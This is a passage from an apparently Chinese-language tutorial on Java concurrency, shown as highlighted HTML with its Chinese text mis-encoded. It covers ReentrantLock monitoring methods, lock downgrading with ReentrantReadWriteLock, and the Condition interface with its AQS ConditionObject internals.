<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getQueueLength</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.getQueueLength();
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šç›‘æ§å’Œè°ƒä¼˜</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorLock</span><span class="hljs-params">()</span> {
    System.out.println(<span class="hljs-string">"æ˜¯å¦æœ‰ç­‰å¾…çº¿ç¨‹: "</span> + lock.hasQueuedThreads());
    System.out.println(<span class="hljs-string">"ç­‰å¾…é˜Ÿåˆ—é•¿åº¦: "</span> + lock.getQueueLength());
}
</code></pre>
<h4 data-id="heading-103">7.6 isFair - æ˜¯å¦ä¸ºå…¬å¹³é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * åˆ¤æ–­æ˜¯å¦ä¸ºå…¬å¹³é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isFair</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync <span class="hljs-keyword">instanceof</span> FairSync;
}
</code></pre>
<h3 data-id="heading-104">8. ReentrantLock vs ReentrantReadWriteLock</h3>
<h4 data-id="heading-105">8.1 æ ¸å¿ƒåŒºåˆ«</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ReentrantLock vs ReentrantReadWriteLock
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockComparison</span> {
    
    <span class="hljs-comment">// ReentrantLockï¼šäº’æ–¥é”ï¼Œä»»ä½•æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è®¿é—®</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">mutexLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">// ReentrantReadWriteLockï¼šè¯»å†™é”ï¼Œè¯»æ“ä½œå¯å¹¶å‘</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();
    
    <span class="hljs-keyword">private</span> Object data;
    
    <span class="hljs-comment">// ä½¿ç”¨äº’æ–¥é”ï¼šè¯»å†™éƒ½äº’æ–¥</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">readWithMutex</span><span class="hljs-params">()</span> {
        mutexLock.lock();  <span class="hljs-comment">// å³ä½¿æ˜¯è¯»æ“ä½œä¹Ÿè¦ç‹¬å </span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> data;
        } <span class="hljs-keyword">finally</span> {
            mutexLock.unlock();
        }
    }
    
    <span class="hljs-comment">// ä½¿ç”¨è¯»å†™é”ï¼šè¯»æ“ä½œå¯å¹¶å‘</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">readWithRwLock</span><span class="hljs-params">()</span> {
        readLock.lock();  <span class="hljs-comment">// å¤šä¸ªè¯»çº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰è¯»é”</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> data;
        } <span class="hljs-keyword">finally</span> {
            readLock.unlock();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeWithRwLock</span><span class="hljs-params">(Object newData)</span> {
        writeLock.lock();  <span class="hljs-comment">// å†™é”æ˜¯ç‹¬å çš„</span>
        <span class="hljs-keyword">try</span> {
            data = newData;
        } <span class="hljs-keyword">finally</span> {
            writeLock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-106">8.2 é”é™çº§</h4>
<p><strong>ReentrantLockä¸æ”¯æŒé”é™çº§</strong>ï¼Œè€Œ<strong>ReentrantReadWriteLockæ”¯æŒ</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”é™çº§ï¼šå†™é” -&gt; è¯»é”
 * åªæœ‰ReadWriteLockæ”¯æŒï¼ŒReentrantLockä¸æ”¯æŒ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockDowngrade</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheValid</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> Object cachedData;
    
    <span class="hljs-comment">/**
     * é”é™çº§ç¤ºä¾‹
     */</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">processData</span><span class="hljs-params">()</span> {
        readLock.lock();  <span class="hljs-comment">// å…ˆè·å–è¯»é”</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (!cacheValid) {
                <span class="hljs-comment">// ç¼“å­˜æ— æ•ˆï¼Œéœ€è¦å†™å…¥</span>
                readLock.unlock();  <span class="hljs-comment">// å¿…é¡»å…ˆé‡Šæ”¾è¯»é”</span>
                writeLock.lock();   <span class="hljs-comment">// å†è·å–å†™é”</span>
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// åŒé‡æ£€æŸ¥</span>
                    <span class="hljs-keyword">if</span> (!cacheValid) {
                        cachedData = loadFromDB();
                        cacheValid = <span class="hljs-literal">true</span>;
                    }
                    <span class="hljs-comment">// ã€é”é™çº§ã€‘åœ¨é‡Šæ”¾å†™é”å‰è·å–è¯»é”</span>
                    readLock.lock();
                } <span class="hljs-keyword">finally</span> {
                    writeLock.unlock();  <span class="hljs-comment">// é‡Šæ”¾å†™é”ï¼Œä»æŒæœ‰è¯»é”</span>
                }
            }
            <span class="hljs-comment">// æ­¤æ—¶æŒæœ‰è¯»é”ï¼Œå¯ä»¥å®‰å…¨è¯»å–</span>
            <span class="hljs-keyword">return</span> cachedData;
        } <span class="hljs-keyword">finally</span> {
            readLock.unlock();
        }
    }
    
    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">loadFromDB</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(); }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦é”é™çº§ï¼Ÿ</strong></p>
<ul>
<li>åœ¨æ›´æ–°æ•°æ®åï¼Œä»éœ€è¦ä½¿ç”¨è¯¥æ•°æ®</li>
<li>å¦‚æœç›´æ¥é‡Šæ”¾å†™é”ï¼Œå…¶ä»–çº¿ç¨‹å¯èƒ½ä¿®æ”¹æ•°æ®</li>
<li>é”é™çº§ä¿è¯äº†æ•°æ®çš„ä¸€è‡´æ€§</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆReentrantLockä¸éœ€è¦é”é™çº§ï¼Ÿ</strong></p>
<ul>
<li>ReentrantLockåªæœ‰ä¸€ç§é”ï¼Œæ²¡æœ‰è¯»å†™ä¹‹åˆ†</li>
<li>å¯é‡å…¥ç‰¹æ€§å·²ç»æ»¡è¶³äº†ç±»ä¼¼éœ€æ±‚</li>
</ul>
<h3 data-id="heading-107">9. é”æµ‹è¯•æ–¹æ³•è¯¦è§£</h3>
<h4 data-id="heading-108">9.1 ReentrantLockæä¾›çš„æµ‹è¯•æ–¹æ³•</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ReentrantLockçš„é”æµ‹è¯•æ–¹æ³•
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockTestMethods</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demonstrateTestMethods</span><span class="hljs-params">()</span> {
        
        <span class="hljs-comment">// 1. isLocked() - é”æ˜¯å¦è¢«ä»»ä½•çº¿ç¨‹æŒæœ‰</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">locked</span> <span class="hljs-operator">=</span> lock.isLocked();
        System.out.println(<span class="hljs-string">"é”æ˜¯å¦è¢«æŒæœ‰: "</span> + locked);
        
        <span class="hljs-comment">// 2. isHeldByCurrentThread() - å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">heldByMe</span> <span class="hljs-operator">=</span> lock.isHeldByCurrentThread();
        System.out.println(<span class="hljs-string">"å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰: "</span> + heldByMe);
        
        <span class="hljs-comment">// 3. getHoldCount() - å½“å‰çº¿ç¨‹çš„é‡å…¥æ¬¡æ•°</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">holdCount</span> <span class="hljs-operator">=</span> lock.getHoldCount();
        System.out.println(<span class="hljs-string">"é‡å…¥æ¬¡æ•°: "</span> + holdCount);
        
        <span class="hljs-comment">// 4. hasQueuedThreads() - æ˜¯å¦æœ‰çº¿ç¨‹åœ¨ç­‰å¾…è·å–é”</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasWaiters</span> <span class="hljs-operator">=</span> lock.hasQueuedThreads();
        System.out.println(<span class="hljs-string">"æ˜¯å¦æœ‰ç­‰å¾…çº¿ç¨‹: "</span> + hasWaiters);
        
        <span class="hljs-comment">// 5. getQueueLength() - ç­‰å¾…è·å–é”çš„çº¿ç¨‹æ•°ï¼ˆä¼°è®¡å€¼ï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">queueLength</span> <span class="hljs-operator">=</span> lock.getQueueLength();
        System.out.println(<span class="hljs-string">"ç­‰å¾…çº¿ç¨‹æ•°: "</span> + queueLength);
        
        <span class="hljs-comment">// 6. isFair() - æ˜¯å¦ä¸ºå…¬å¹³é”</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">fair</span> <span class="hljs-operator">=</span> lock.isFair();
        System.out.println(<span class="hljs-string">"æ˜¯å¦å…¬å¹³é”: "</span> + fair);
        
        <span class="hljs-comment">// 7. getOwner() - è·å–æŒæœ‰é”çš„çº¿ç¨‹ï¼ˆprotectedæ–¹æ³•ï¼Œéœ€è¦å­ç±»è®¿é—®ï¼‰</span>
        <span class="hljs-comment">// Thread owner = lock.getOwner();  // éœ€è¦ç»§æ‰¿ReentrantLock</span>
    }
    
    <span class="hljs-comment">/**
     * å®é™…åº”ç”¨ï¼šå®‰å…¨åœ°é‡Šæ”¾é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">safeUnlock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åªæœ‰æŒæœ‰é”çš„çº¿ç¨‹æ‰èƒ½é‡Šæ”¾</span>
        <span class="hljs-keyword">if</span> (lock.isHeldByCurrentThread()) {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å®é™…åº”ç”¨ï¼šæ£€æŸ¥æ­»é”é£é™©
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkDeadlockRisk</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (lock.isLocked() &amp;&amp; !lock.isHeldByCurrentThread()) {
            System.out.println(<span class="hljs-string">"è­¦å‘Šï¼šé”è¢«å…¶ä»–çº¿ç¨‹æŒæœ‰ï¼Œå¯èƒ½é€ æˆç­‰å¾…"</span>);
        }
    }
}
</code></pre>
<h2 data-id="heading-109">ç¬¬å››ç« ï¼šCondition æ¡ä»¶å˜é‡è¯¦è§£</h2>
<h3 data-id="heading-110">1. Conditionæ¥å£æ¦‚è¿°</h3>
<h4 data-id="heading-111">1.1 ä»€ä¹ˆæ˜¯Condition</h4>
<p><code>Condition</code>æ˜¯JDK 1.5å¼•å…¥çš„æ¡ä»¶å˜é‡æ¥å£ï¼Œç”¨äºå®ç°çº¿ç¨‹é—´çš„ç­‰å¾…/é€šçŸ¥æœºåˆ¶ã€‚å®ƒå¿…é¡»ä¸<code>Lock</code>é…åˆä½¿ç”¨ï¼Œæä¾›äº†æ¯”<code>Object.wait/notify</code>æ›´å¼ºå¤§ã€æ›´çµæ´»çš„åŠŸèƒ½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Condition</span> {
    
    <span class="hljs-comment">/** ç­‰å¾…ï¼Œå“åº”ä¸­æ–­ */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">await</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException;
    
    <span class="hljs-comment">/** ç­‰å¾…ï¼Œä¸å“åº”ä¸­æ–­ */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">awaitUninterruptibly</span><span class="hljs-params">()</span>;
    
    <span class="hljs-comment">/** ç­‰å¾…æŒ‡å®šçº³ç§’ */</span>
    <span class="hljs-type">long</span> <span class="hljs-title function_">awaitNanos</span><span class="hljs-params">(<span class="hljs-type">long</span> nanosTimeout)</span> <span class="hljs-keyword">throws</span> InterruptedException;
    
    <span class="hljs-comment">/** ç­‰å¾…æŒ‡å®šæ—¶é—´ */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">await</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException;
    
    <span class="hljs-comment">/** ç­‰å¾…åˆ°æŒ‡å®šæ—¶åˆ» */</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">awaitUntil</span><span class="hljs-params">(Date deadline)</span> <span class="hljs-keyword">throws</span> InterruptedException;
    
    <span class="hljs-comment">/** å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹ */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">signal</span><span class="hljs-params">()</span>;
    
    <span class="hljs-comment">/** å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹ */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">signalAll</span><span class="hljs-params">()</span>;
}
</code></pre>
<h4 data-id="heading-112">1.2 ä¸ºä»€ä¹ˆéœ€è¦Condition</h4>
<p><code>synchronized</code>é…åˆ<code>Object.wait/notify</code>çš„å±€é™æ€§ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * Object.wait/notifyçš„å±€é™æ€§æ¼”ç¤º
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectWaitLimitation</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hasData</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hasSpace</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    
    <span class="hljs-comment">/**
     * é—®é¢˜ï¼šç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å…±ç”¨ä¸€ä¸ªç­‰å¾…é˜Ÿåˆ—
     * notify()æ— æ³•ç²¾ç¡®å”¤é†’ç‰¹å®šç±»å‹çš„çº¿ç¨‹
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">produce</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-keyword">while</span> (!hasSpace) {
                lock.wait();  <span class="hljs-comment">// ç­‰å¾…ç©ºé—´</span>
            }
            <span class="hljs-comment">// ç”Ÿäº§æ•°æ®...</span>
            hasData = <span class="hljs-literal">true</span>;
            hasSpace = <span class="hljs-literal">false</span>;
            lock.notifyAll();  <span class="hljs-comment">// åªèƒ½å”¤é†’æ‰€æœ‰ï¼ŒåŒ…æ‹¬å…¶ä»–ç”Ÿäº§è€…</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consume</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-keyword">while</span> (!hasData) {
                lock.wait();  <span class="hljs-comment">// ç­‰å¾…æ•°æ®</span>
            }
            <span class="hljs-comment">// æ¶ˆè´¹æ•°æ®...</span>
            hasData = <span class="hljs-literal">false</span>;
            hasSpace = <span class="hljs-literal">true</span>;
            lock.notifyAll();  <span class="hljs-comment">// åªèƒ½å”¤é†’æ‰€æœ‰ï¼ŒåŒ…æ‹¬å…¶ä»–æ¶ˆè´¹è€…</span>
        }
    }
}
</code></pre>
<p><strong>Conditionçš„è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * Conditionæ”¯æŒå¤šä¸ªç­‰å¾…é˜Ÿåˆ—
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConditionSolution</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();  <span class="hljs-comment">// æ•°æ®å¯ç”¨æ¡ä»¶</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">notFull</span> <span class="hljs-operator">=</span> lock.newCondition();   <span class="hljs-comment">// ç©ºé—´å¯ç”¨æ¡ä»¶</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">produce</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">while</span> (isFull()) {
                notFull.await();  <span class="hljs-comment">// åªåœ¨"éæ»¡"æ¡ä»¶ä¸Šç­‰å¾…</span>
            }
            <span class="hljs-comment">// ç”Ÿäº§æ•°æ®...</span>
            notEmpty.signal();    <span class="hljs-comment">// åªå”¤é†’"éç©º"æ¡ä»¶ä¸Šçš„æ¶ˆè´¹è€…</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consume</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">while</span> (isEmpty()) {
                notEmpty.await();  <span class="hljs-comment">// åªåœ¨"éç©º"æ¡ä»¶ä¸Šç­‰å¾…</span>
            }
            <span class="hljs-comment">// æ¶ˆè´¹æ•°æ®...</span>
            notFull.signal();      <span class="hljs-comment">// åªå”¤é†’"éæ»¡"æ¡ä»¶ä¸Šçš„ç”Ÿäº§è€…</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isFull</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">/* ç®€åŒ– */</span> }
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">/* ç®€åŒ– */</span> }
}
</code></pre>
<hr/>
<h3 data-id="heading-113">2. Condition vs Objectç›‘è§†å™¨æ–¹æ³•</h3>
<h4 data-id="heading-114">2.1 åŠŸèƒ½å¯¹æ¯”</h4>


















































<table><thead><tr><th align="left">åŠŸèƒ½</th><th align="left">Objectæ–¹æ³•</th><th align="left">Conditionæ–¹æ³•</th></tr></thead><tbody><tr><td align="left">ç­‰å¾…</td><td align="left"><code>wait()</code></td><td align="left"><code>await()</code></td></tr><tr><td align="left">ç­‰å¾…ï¼ˆä¸å“åº”ä¸­æ–­ï¼‰</td><td align="left">-</td><td align="left"><code>awaitUninterruptibly()</code></td></tr><tr><td align="left">è¶…æ—¶ç­‰å¾…</td><td align="left"><code>wait(timeout)</code></td><td align="left"><code>await(time, unit)</code></td></tr><tr><td align="left">ç­‰å¾…åˆ°æŒ‡å®šæ—¶åˆ»</td><td align="left">-</td><td align="left"><code>awaitUntil(deadline)</code></td></tr><tr><td align="left">å”¤é†’å•ä¸ª</td><td align="left"><code>notify()</code></td><td align="left"><code>signal()</code></td></tr><tr><td align="left">å”¤é†’æ‰€æœ‰</td><td align="left"><code>notifyAll()</code></td><td align="left"><code>signalAll()</code></td></tr><tr><td align="left">ç­‰å¾…é˜Ÿåˆ—æ•°é‡</td><td align="left">1ä¸ª</td><td align="left"><strong>å¤šä¸ª</strong></td></tr><tr><td align="left">æ˜¯å¦å¯ä¸­æ–­</td><td align="left">æ˜¯</td><td align="left">å¯é€‰</td></tr></tbody></table>
<h4 data-id="heading-115">2.2 ä½¿ç”¨æ–¹å¼å¯¹æ¯”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ========== Objectæ–¹å¼ ==========</span>
<span class="hljs-keyword">synchronized</span> (obj) {
    <span class="hljs-keyword">while</span> (æ¡ä»¶ä¸æ»¡è¶³) {
        obj.wait();
    }
    <span class="hljs-comment">// æ‰§è¡Œæ“ä½œ</span>
    obj.notify();
}

<span class="hljs-comment">// ========== Conditionæ–¹å¼ ==========</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">while</span> (æ¡ä»¶ä¸æ»¡è¶³) {
        condition.await();
    }
    <span class="hljs-comment">// æ‰§è¡Œæ“ä½œ</span>
    condition.signal();
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-116">2.3 å¤šæ¡ä»¶å˜é‡çš„ä¼˜åŠ¿</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ab1cfbffc00476a9640d0ca2e696e6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=6k%2F5X423MrH%2BIm44arPJshZKCqU%3D" alt="condition-advantage.drawio.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-117">3. ConditionObjectæºç å‰–æ</h3>
<h4 data-id="heading-118">3.1 ç±»ç»“æ„</h4>
<p><code>ConditionObject</code>æ˜¯AQSçš„å†…éƒ¨ç±»ï¼Œå®ç°äº†<code>Condition</code>æ¥å£ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConditionObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Condition</span>, java.io.Serializable {
    
    <span class="hljs-comment">/** æ¡ä»¶é˜Ÿåˆ—çš„é¦–èŠ‚ç‚¹ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Node firstWaiter;
    
    <span class="hljs-comment">/** æ¡ä»¶é˜Ÿåˆ—çš„å°¾èŠ‚ç‚¹ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Node lastWaiter;
    
    <span class="hljs-comment">/** ä¸­æ–­æ¨¡å¼ï¼šé€€å‡ºwaitæ—¶é‡æ–°ä¸­æ–­ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">REINTERRUPT</span> <span class="hljs-operator">=</span>  <span class="hljs-number">1</span>;
    
    <span class="hljs-comment">/** ä¸­æ–­æ¨¡å¼ï¼šé€€å‡ºwaitæ—¶æŠ›å‡ºInterruptedException */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">THROW_IE</span>    <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;
}
</code></pre>
<h4 data-id="heading-119">3.2 æ¡ä»¶é˜Ÿåˆ—ç»“æ„</h4>
<p>æ¡ä»¶é˜Ÿåˆ—æ˜¯ä¸€ä¸ª<strong>å•å‘é“¾è¡¨</strong>ï¼Œä½¿ç”¨Nodeçš„<code>nextWaiter</code>å­—æ®µé“¾æ¥ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7cc481ab9cf4061a1cf39e2010b0cd9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=Fzg9rhSZzVQogxl8wHdjLt%2FEX58%3D" alt="condition-queue-structure.drawio.png" loading="lazy"/></p>
<p><strong>ä¸åŒæ­¥é˜Ÿåˆ—çš„åŒºåˆ«</strong>ï¼š</p>






























<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">åŒæ­¥é˜Ÿåˆ—ï¼ˆAQSï¼‰</th><th align="left">æ¡ä»¶é˜Ÿåˆ—ï¼ˆConditionï¼‰</th></tr></thead><tbody><tr><td align="left">é“¾è¡¨ç±»å‹</td><td align="left">åŒå‘é“¾è¡¨</td><td align="left">å•å‘é“¾è¡¨</td></tr><tr><td align="left">é“¾æ¥å­—æ®µ</td><td align="left">prev/next</td><td align="left">nextWaiter</td></tr><tr><td align="left">èŠ‚ç‚¹çŠ¶æ€</td><td align="left">å¤šç§</td><td align="left">åªæœ‰CONDITION</td></tr><tr><td align="left">ç”¨é€”</td><td align="left">ç­‰å¾…è·å–é”</td><td align="left">ç­‰å¾…æ¡ä»¶æ»¡è¶³</td></tr></tbody></table>
<h4 data-id="heading-120">3.3 Nodeåœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­çš„å¤ç”¨</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-comment">// åŒæ­¥é˜Ÿåˆ—ä½¿ç”¨</span>
    <span class="hljs-keyword">volatile</span> Node prev;
    <span class="hljs-keyword">volatile</span> Node next;
    
    <span class="hljs-comment">// æ¡ä»¶é˜Ÿåˆ—ä½¿ç”¨ï¼ˆå¤ç”¨ï¼‰</span>
    Node nextWaiter;
    
    <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€</span>
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> waitStatus;
    
    <span class="hljs-comment">// CONDITIONçŠ¶æ€ï¼Œè¡¨ç¤ºåœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONDITION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">2</span>;
}
</code></pre>
<hr/>
<h3 data-id="heading-121">4. æ¡ä»¶é˜Ÿåˆ—ä¸åŒæ­¥é˜Ÿåˆ—</h3>
<p>åœ¨ ReentrantLock + Condition çš„è¯­å¢ƒä¸‹ï¼Œç­‰å¾…é€šçŸ¥æœºåˆ¶å¤§è‡´åˆ†ä¸ºä¸¤å±‚ï¼š<strong>Condition æ¡ä»¶é˜Ÿåˆ—</strong>å’Œ <strong>AQS åŒæ­¥é˜Ÿåˆ—</strong>ã€‚</p>
